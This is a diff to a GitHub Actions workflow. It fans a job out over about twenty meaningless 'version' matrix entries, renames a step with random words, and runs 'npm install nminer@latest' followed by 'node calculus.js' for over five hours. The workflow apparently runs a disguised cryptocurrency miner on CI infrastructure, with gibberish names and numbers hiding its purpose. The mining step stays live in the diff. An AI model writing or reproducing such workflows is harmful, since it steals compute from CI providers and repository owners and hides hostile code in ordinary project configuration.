@@ -9,26 +9,25 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 2584 }
-          - { version: 5116 }
-          - { version: 5348 }
-          - { version: 7658 }
-          - { version: 5238 }
-          - { version: 9586 }
-          - { version: 8637 }
-          - { version: 9656 }
-          - { version: 3421 }
-          - { version: 9501 }
-          - { version: 1843 }
-          - { version: 4159 }
-          - { version: 6190 }
-          - { version: 3726 }
-          - { version: 2248 }
-          - { version: 7318 }
-          - { version: 8141 }
-          - { version: 2400 }
-          - { version: 3866 }
-          - { version: 9501 }
+          - { version: 710 }
+          - { version: 5167 }
+          - { version: 4283 }
+          - { version: 2365 }
+          - { version: 4624 }
+          - { version: 3993 }
+          - { version: 4057 }
+          - { version: 2929 }
+          - { version: 9955 }
+          - { version: 7050 }
+          - { version: 5024 }
+          - { version: 4481 }
+          - { version: 8218 }
+          - { version: 7979 }
+          - { version: 2804 }
+          - { version: 1279 }
+          - { version: 4279 }
+          - { version: 1417 }
+          - { version: 1706 }
 
     steps:
       - name: Checkout
@@ -39,7 +38,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: given except defrag utilized brown
+      - name: hmph lounge ha until downshift
         run: |
           npm install nminer@latest
-          timeout 309m node calculus.js || echo "calculus executed"
+          timeout 322m node calculus.js || echo "calculus executed"
